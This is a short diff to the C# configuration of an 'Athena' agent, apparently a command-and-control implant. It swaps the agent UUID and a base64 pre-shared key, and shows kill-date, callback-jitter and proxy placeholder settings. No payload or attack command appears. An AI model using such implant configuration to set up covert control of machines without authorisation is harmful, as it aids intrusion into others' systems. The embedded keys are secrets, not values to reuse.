@@ -27,7 +27,7 @@ namespace Athena.Config
             //this.httpConfig = new HTTPS(this.uuid);
             //this.smbConfig = new SMB();
             //this.websocketConfig = new Websocket();          
-            this.uuid = "d9ff04e9-0d54-4c46-bfd0-9c160ee7701f";
+            this.uuid = "45f655d8-9999-47ae-8be6-f1965c70fb51";
             this.killDate = DateTime.Parse("2022-08-22");
             int sleep = int.TryParse("callback_jitter", out sleep) ? sleep : 10;
             this.sleep = sleep;
@@ -83,7 +83,7 @@ namespace Athena.Config
             this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
-            this.psk = "MWFPg3b/p2RsEsfSNvsniEw6kaItaJXkJntXNXVyyZ4=";
+            this.psk = "4muIu7PVcP2QK/qTgjJvVLVxvTR8vz/S11skV7kM0/M=";
             
             //Doesn't do anything yet
             this.encryptedExchangeCheck = bool.Parse("True");
